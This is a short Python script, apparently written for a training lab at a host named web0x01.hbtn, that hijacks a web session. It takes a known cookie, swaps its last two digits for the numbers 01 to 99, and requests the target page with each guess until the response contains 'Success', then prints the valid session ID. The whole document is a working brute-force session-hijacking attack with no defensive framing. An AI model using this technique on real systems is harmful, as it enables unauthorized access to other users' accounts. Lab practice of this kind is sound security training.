import requests

url = "http://web0x01.hbtn/a1/hijack_session"
original_cookie = "4a9b9337-f5a7-4c09-bdb-6952307-17341697333"  # Replace with your cookie
for i in range(1, 100):
    test_cookie = original_cookie[:-2] + str(i).zfill(2)  # Change the last digits
    headers = {"Cookie": f"hijack_session={test_cookie}"}
    response = requests.get(url, headers=headers)
    if "Success" in response.text:  # Replace with a success condition
        print(f"Valid session found: {test_cookie}")
        break
